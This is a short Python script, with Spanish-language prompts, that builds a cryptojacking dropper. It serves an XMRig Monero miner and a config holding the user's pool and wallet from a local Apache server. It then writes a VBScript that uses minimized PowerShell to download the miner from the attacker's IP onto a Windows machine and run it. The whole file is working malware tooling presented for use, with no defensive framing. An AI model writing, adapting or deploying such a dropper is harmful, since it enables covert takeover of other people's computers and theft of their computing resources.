import os

path = os.getcwd()
path_config = os.getcwd()+"/extras/config.json"
path_win = "C:/escritorio/xmrig.exe"
path_miner = os.getcwd()+"/extras/xmrig.exe"


def clearScr():
    os.system('clear')


clearScr()
os.system('service apache2 start')

windows_ip = input("""
                   Introduzca la IP de su dispositivo

                   > """)
pool = input("""
             Ponga el nombre de la pool donde quiere minar
             [ejemplo: 2miner, hashmonero, xmrfast ...]

             >  """)

wallet = input("""
               Introduzca el cÃ³digo de su wallet Monero

               >  """)

os.system('cp '+ path_config +' '+ path +'')

with open("config.json", "rt")as f:
    x = f.read()

with open("config.json", "wt")as f:
    x = x.replace("optionone",""+ pool +"")
    x = x.replace("optiontwo", ""+ wallet +"")
    f.write(x)

os.system('mv config.json /var/www/html/')
os.system('cp '+ path_miner +' /var/www/html/')

VBScript = "Set WshShell = WScript.CreateObject(\"Wscript.Shell\")\n"\
           "return = WshShell.Run (\"powershell -noexit -windowstyle minimized -c iwr -uri http://"+ windows_ip +"/xmrig.exe -OutFile C:\\Users\\aaron\\Downloads\\xmrig.exe -UseBasicParsing;powershell -noexit -windowstyle minimized -c iwr -uri http://"+ windows_ip +"/config.json -OutFile C:\\Users\\aaron\\Downloads\\config.json -UseBasicParsing\", 1, true)\n"\
           "WScript.Sleep 10000\n"\
           "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n"\
           "Return = WshShell.Run(\"C:\\Users\\aaron\\downloads\\xmrig.exe\", 1, true)"


with open("prueba.vbs", "wt")as f:
    f.write(VBScript)




















